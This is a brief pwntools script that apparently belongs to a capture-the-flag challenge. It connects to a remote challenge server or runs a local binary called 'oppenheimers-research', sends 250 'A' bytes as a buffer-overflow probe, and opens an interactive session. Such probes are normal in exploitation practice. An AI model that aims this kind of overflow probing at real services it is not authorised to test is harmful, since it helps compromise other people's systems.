from pwn import *

if args.REMOTE:
    host = "34.75.76.65"
    port = 9000
    p = remote(host, port)
else:
    p = process("./static/oppenheimers-research")
# host = "localhost"
# port = 4444
# p = remote(host, port)

p.sendline(b'A' * 250)
p.interactive()